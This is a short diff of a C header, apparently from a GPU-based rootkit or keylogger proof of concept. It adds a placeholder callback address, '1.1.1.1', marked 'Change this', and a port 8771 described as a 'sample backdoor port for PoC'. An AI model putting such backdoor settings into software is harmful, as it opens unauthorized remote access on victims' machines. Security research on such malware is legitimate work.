@@ -52,6 +52,12 @@ GNU General Public License for more details.
 #define __JELLYXOR__ "xor.cl"
 #define VRAM_LIMIT 1497965  /* 10mb divided by 7 gpu kernels */
 
+/* Change this */
+#define ADDRESS "1.1.1.1"
+/* ---------- */
+
+#define PORT 8771  // sample backdoor port for PoC
+
 // gpu functions
 #define log_fopen "log_fopen"
 #define log_mkdir "log_mkdir"
